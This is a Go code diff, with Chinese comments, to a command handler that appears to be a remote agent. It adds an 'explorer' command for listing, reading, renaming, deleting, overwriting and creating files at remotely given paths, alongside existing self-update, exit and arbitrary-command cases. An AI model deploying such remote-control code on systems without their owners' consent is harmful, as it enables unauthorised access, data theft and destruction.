@@ -162,13 +162,14 @@ func (h *Handler) HandleCommand() {
 			if err != nil {
 				hasError = true
 				response = encode.StringToByte(err.Error())
-			}
-			// 下载文件
-			err = h.Services.Download.DownloadFile(m["filename"], m["path"])
+			} else {
+				// 下载文件
+				err = h.Services.Download.DownloadFile(m["filename"], m["path"])
 
-			if err != nil {
-				hasError = true
-				response = encode.StringToByte(err.Error())
+				if err != nil {
+					hasError = true
+					response = encode.StringToByte(err.Error())
+				}
 			}
 		case "update":
 			filename := request.Parameter
@@ -204,7 +205,7 @@ func (h *Handler) HandleCommand() {
 			if err != nil {
 				hasError = true
 				response = encode.StringToByte(err.Error())
-				return
+				break
 			}
 
 			// 等待一段时间以确保新进程已经启动
@@ -214,7 +215,59 @@ func (h *Handler) HandleCommand() {
 			os.Exit(0)
 		case "exit":
 			os.Exit(0)
-
+		case "explorer":
+			p := request.Parameter
+			var fileExplorerQuery entitie.FileExplorerQuery
+			err := json.Unmarshal([]byte(p), &fileExplorerQuery)
+			if err != nil {
+				hasError = true
+				response = encode.StringToByte(err.Error())
+				break
+			}
+			op := fileExplorerQuery.Op
+			path := fileExplorerQuery.Path
+			switch op {
+			case "list":
+				res, err := h.Services.FileExplorer.GetFileExplorer(path)
+				if err != nil {
+					hasError = true
+					response = encode.StringToByte(err.Error())
+				}
+				response = encode.StringToByte(encode.PrettyJson(res))
+			case "cat":
+				res, err := h.Services.FileExplorer.ReadFile(path)
+				if err != nil {
+					hasError = true
+					response = encode.StringToByte(err.Error())
+				}
+				response = res
+			case "rename":
+				newFilename := fileExplorerQuery.Filename
+				err := h.Services.FileExplorer.Rename(path, newFilename)
+				if err != nil {
+					hasError = true
+					response = encode.StringToByte(err.Error())
+				}
+			case "remove":
+				err := h.Services.FileExplorer.Remove(path)
+				if err != nil {
+					hasError = true
+					response = encode.StringToByte(err.Error())
+				}
+			case "edit":
+				fileContent := fileExplorerQuery.FileContent
+				err := h.Services.FileExplorer.WriteFile(path, []byte(fileContent))
+				if err != nil {
+					hasError = true
+					response = encode.StringToByte(err.Error())
+				}
+			case "mkdir":
+				err := h.Services.FileExplorer.MkDir(path)
+				if err != nil {
+					hasError = true
+					response = encode.StringToByte(err.Error())
+				}
+			}
 		default:
 			response, err = h.RunCommand(request.Command)
 			if err != nil {
